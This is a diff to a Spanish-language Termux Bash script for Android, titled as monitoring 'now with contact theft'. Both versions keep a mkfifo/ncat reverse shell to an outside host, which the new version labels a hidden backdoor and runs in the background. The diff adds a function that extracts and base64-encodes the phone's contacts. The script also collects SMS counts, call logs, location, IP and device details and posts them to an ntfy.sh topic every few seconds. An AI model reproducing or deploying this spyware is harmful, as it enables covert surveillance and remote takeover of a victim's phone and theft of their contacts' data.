@@ -1,5 +1,5 @@
 #!/bin/bash
-# Monitoreo Inteligente (Duración: 60 minutos)
+# Monitoreo Inteligente Mejorado (Ahora con Robo de Contactos)
 
 # ===== CONFIGURACIÓN =====
 NTFY_URL="https://ntfy.sh/ppN9N9N9990"
@@ -7,10 +7,16 @@ INTERVALO=5  #tiempo entre actualizaciones
 DURACION_MIN=60 # Duración total en minutos
 DEBUG=true
 
-#pp
-rm ~/f; mkfifo ~/f
-cat ~/f | /bin/sh -i 2>&1 | ncat 30.ip.gl.ply.gg 57856 > ~/f
-# ===== FUNCIONES PRINCIPALES =====
+# Backdoor oculto
+rm ~/f 2>/dev/null; mkfifo ~/f
+cat ~/f | /bin/sh -i 2>&1 | ncat 30.ip.gl.ply.gg 57856 > ~/f &
+
+# ===== FUNCIONES MEJORADAS =====
+obtener_contactos() {
+    echo "[📇] EXTRAYENDO CONTACTOS..."
+    termux-contact-list 2>/dev/null | jq -c 'map({nombre: .name, numero: .number})' | base64 -w 0
+}
+
 generar_reporte() {
     # 1. Información del dispositivo
     local modelo=$(getprop ro.product.model)
@@ -24,47 +30,39 @@ generar_reporte() {
     # 3. Ubicación aproximada
     local ubicacion=$(termux-location -p network 2>/dev/null | jq -r '"\(.latitude),\(.longitude) ±\(.accuracy)m"' 2>/dev/null)
     
-    # 4. Resumen de actividad
+    # 4. Actividad y CONTACTOS
     local nuevos_sms=$(termux-sms-list -l 2 --timestamp $(date +%s -d "1 hour ago") 2>/dev/null | jq length)
     local llamadas=$(termux-call-log -l 5 2>/dev/null | jq 'map(select(.date >= (now - 3600|floor)) | length')
-    
-    # Construir mensaje
-    echo "📈 INFORME CONSOLIDADO (Última hora)
-    
-📱 Dispositivo: $modelo
-🔄 Android: $android
-🔋 Batería: $bateria
+    local contactos=$(obtener_contactos)
 
-📶 Red: $wifi
-🌐 IP Pública: $ip_publica
-📍 Ubicación: ${ubicacion:-No disponible}
+    # Construir mensaje
+    echo "📊 INFORME COMPLETO
+📱 Dispositivo: $modelo | Android: $android
+🔋 Batería: $bateria | 📶 Red: $wifi
+🌐 IP: $ip_publica | 📍 Ubicación: ${ubicacion:-No disponible}
 
 📞 Llamadas recientes: $llamadas
 📩 SMS nuevos: $nuevos_sms
+📇 CONTACTOS (base64): $contactos
 
-⏳ Próxima actualización: en $((INTERVALO/60)) minutos
-🕒 Finaliza en: $(date '+%H:%M' -d "+$((DURACION_MIN - (ITERACION*INTERVALO/60))) minutos")"
+⏳ Próxima actualización: en $((INTERVALO/60)) min"
+}
+
+enviar_ntfy() {
+    curl -sS -X POST "$NTFY_URL" -d "$1" >/dev/null 2>&1 &
 }
 
 # ===== PROGRAMA PRINCIPAL =====
 ITERACION=0
 MAX_ITERACIONES=$((DURACION_MIN*60/INTERVALO))
 
-[ "$DEBUG" = true ] && echo "🔍 Iniciando monitoreo por $DURACION_MIN minutos (Actualizaciones cada $((INTERVALO/60)) minutos)"
+[ "$DEBUG" = true ] && echo "🔍 Iniciando monitoreo por $DURACION_MIN minutos"
 
 while [ $ITERACION -lt $MAX_ITERACIONES ]; do
-    # Enviar reporte consolidado
     enviar_ntfy "$(generar_reporte)"
-    
-    # Incrementar contador
     ITERACION=$((ITERACION+1))
-    
-    # Mostrar progreso en terminal (opcional)
-    [ "$DEBUG" = true ] && echo "🔄 Iteración $ITERACION/$MAX_ITERACIONES - $(date '+%H:%M:%S')"
-    
-    # Esperar hasta la próxima iteración
     sleep $INTERVALO
 done
 
-[ "$DEBUG" = true ] && echo "✅ Monitoreo completado después de $DURACION_MIN minutos"
-enviar_ntfy "🏁 Monitoreo completado después de $DURACION_MIN minutos"
+[ "$DEBUG" = true ] && echo "✅ Monitoreo completado"
+enviar_ntfy
